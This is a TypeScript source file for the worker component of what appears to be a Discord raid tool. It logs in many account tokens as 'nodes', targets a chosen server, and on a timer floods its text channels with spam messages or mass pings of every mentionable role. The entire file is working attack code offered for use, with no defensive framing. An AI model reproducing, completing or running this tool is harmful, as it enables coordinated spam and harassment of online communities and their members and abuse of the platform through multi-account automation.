import {Client, Guild, TextChannel, GuildChannel, Snowflake, Role} from "discord.js";
import App, {AttackMode} from "./app";
import Utils from "./utils";

export default class Worker {
    private readonly app: App;

    private nodes: Client[];

    private guild?: Guild;
    private channelCache?: TextChannel[];
    private attackInterval?: NodeJS.Timeout;
    private nodeIterator: number;
    private msgIterator: number;

    public constructor(app: App) {
        this.app = app;
        this.nodes = [];
        this.nodeIterator = 0;
        this.msgIterator = 0;
    }

    public async loadNodes(): Promise<number> {
        this.nodes = [];

        let loaded: number = 0;

        // TODO: Check for successful node creation
        for (let i: number = 0; i < this.app.tokens.length; i++) {
            const node: Client | null = await this.createNode(this.app.tokens[i]);

            if (node !== null) {
                this.nodes.push(node);
                loaded++;
            }
        }

        return loaded;
    }

    public async prepare(): Promise<this> {
        let amount: number = this.app.options.PREPARE_NODE_AMOUNT === "all" ? this.app.tokens.length : this.app.options.PREPARE_NODE_AMOUNT;

        if (amount > this.nodes.length) {
            amount = this.nodes.length;
        }

        this.app.log(`Preparing ${amount} node(s) ...`);

        for (let i: number = 0; i < this.nodes.length; i++) {
            if (!this.nodes[i].guilds.has(this.app.options.TARGET_GUILD_ID)) {
                // TODO: Join node by invite here
            }
            else if (!this.guild) {
                this.guild = this.nodes[i].guilds.get(this.app.options.TARGET_GUILD_ID) as Guild;
                this.populateChannelCache();
            }
        }

        return this;
    }

    private populateChannelCache(): this {
        if (!this.guild) {
            throw new Error("[Worker.populateChannelCache] Expecting guild");
        }

        this.channelCache = this.guild.channels.filter((channel: GuildChannel) => {
            // TODO: Also check for SEND_MESSAGES permission
            return channel.type === "text" && !this.app.options.TARGET_GUILD_CHANNELS_AVOID.includes(channel.id);
        }).array() as any;

        return this;
    }

    private getRandomChannel(node: Client): TextChannel {
        if (!this.channelCache) {
            this.populateChannelCache();

            if (!this.channelCache) {
                throw new Error("[Worker.getRandomChannel] Expecting channel cache to be populated");
            }
        }

        return node.channels.get(this.channelCache[Utils.getRandomInt(0, this.channelCache.length)].id) as TextChannel;
    }

    private getNextNode(): Client {
        this.nodeIterator++;

        if (this.nodeIterator >= this.nodes.length) {
            this.nodeIterator = 1;
        }

        return this.nodes[this.nodeIterator - 1];
    }

    // TODO: Channels are bound to specific nodes
    private getRandomNodeRandomChannel(): TextChannel {
        return this.getRandomChannel(this.getNextNode())
    }

    // TODO: Determine if we can keep sending messages, etc.
    private canContinue(): boolean {
        return true;
    }

    public start(): Promise<number> {
        let sent: number = 0;

        if (this.app.options.MODE !== AttackMode.DMs && !this.guild) {
            throw new Error("[Worker.start] Expecting guild and channel");
        }

        if (this.app.options.MODE === AttackMode.Random || this.app.options.MODE === AttackMode.RandomPings) {
            return new Promise((resolve) => {
                this.attackInterval = setInterval(() => {
                    if (!this.canContinue()) {
                        this.cleanup();
                        resolve(sent);

                        return;
                    }

                    this.sendPayload();
                    sent += this.nodes.length;
                }, this.app.options.MESSAGES_SEND_INTERVAL);
            });
        }
        else {
            throw new Error("[Worker.start] An invalid mode was specified");
        }
    }

    private sendPayload(): this {
        let payload: string = "Payload!";

        switch (this.app.options.MODE) {
            case AttackMode.Random: {
                payload = this.app.messages[this.msgIterator];
                this.msgIterator++;

                if (this.msgIterator >= this.app.messages.length) {
                    this.msgIterator = 0;
                }

                break;
            }

            case AttackMode.RandomPings: {
                if (!this.guild) {
                    throw new Error("[Worker.sendPayload] Expecting guild");
                }

                // TODO: Avoid admins and cycle roles, also inefficient to loop through them every time
                const mentionableRoles: Role[] = this.guild.roles.filter((role: Role) => role.mentionable).array();

                // TODO: Should be done in the first client's load
                if (mentionableRoles.length === 0) {
                    throw new Error("[Worker.sendPayload] Target guild has no mentionable roles");
                }

                payload = mentionableRoles.map((role) => role.toString()).join(" ");

                break;
            }

            default: {
                throw new Error(`[Worker.sendPayload] Mode invalid or not supported: ${this.app.options.MODE}`);
            }
        }

        for (let i: number = 0; i < this.nodes.length; i++) {
            this.getRandomNodeRandomChannel().send(payload);
        }

        return this;
    }

    private cleanup(): this {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }

        this.nodeIterator = 0;
        this.msgIterator = 0;

        return this;
    }

    // TODO: Catch login errors (invalid tokens)
    private async createNode(token: string): Promise<Client | null> {
        const node: Client = new Client();

        return new Promise<Client | null>((resolve) => {
            node.once("ready", () => {
                resolve(node);
            });

            node.login(token).catch((error: Error) => {
                if (error.message === "An invalid token was provided.") {
                    resolve(null);
                }
            });
        });
    }
}